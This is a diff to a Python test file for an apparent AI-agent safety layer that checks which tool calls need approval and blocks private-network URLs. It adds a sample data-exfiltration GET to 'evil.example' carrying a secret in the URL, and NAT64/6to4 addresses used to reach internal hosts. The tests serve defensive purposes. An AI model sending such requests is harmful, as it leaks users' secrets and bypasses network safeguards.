@@ -31,7 +31,10 @@ def test_what_needs_approval() -> None:
     assert sa.needs_approval("send_email", {})
     assert sa.needs_approval("create_meeting", {})
     assert sa.needs_approval("http_request", {"method": "POST"})
-    assert not sa.needs_approval("http_request", {"method": "GET"})
+    allowed = sa.hosts_named_in("Check stock at https://api.supplier.com/v1/stock")
+    assert not sa.needs_approval("http_request", {"method": "GET", "url": "https://api.supplier.com/x"}, allowed)
+    # A GET anywhere the skill does not name could carry data out in its URL.
+    assert sa.needs_approval("http_request", {"method": "GET", "url": "https://evil.example/?d=secret"}, allowed)
     assert not sa.needs_approval("read_file", {})
 
 
@@ -109,3 +112,15 @@ async def test_private_and_internal_urls_are_refused(url) -> None:
 
 async def test_public_ip_literal_is_allowed() -> None:
     assert await net_safety.check_public_url("https://8.8.8.8/x") == "https://8.8.8.8/x"
+
+
+def test_pinned_request_keeps_host_for_tls() -> None:
+    url, headers, ext = net_safety.pinned_request_args("https://api.example.com:8443/v1?q=1", "93.184.216.34")
+    assert url == "https://93.184.216.34:8443/v1?q=1"
+    assert headers == {"Host": "api.example.com:8443"} and ext == {"sni_hostname": "api.example.com"}
+
+
+@pytest.mark.parametrize("url", ["http://[64:ff9b::a00:1]/", "http://[2002:a00:1::]/"])
+async def test_nat64_and_6to4_are_refused(url) -> None:
+    with pytest.raises(net_safety.UnsafeUrl):
+        await net_safety.check_public_url(url)
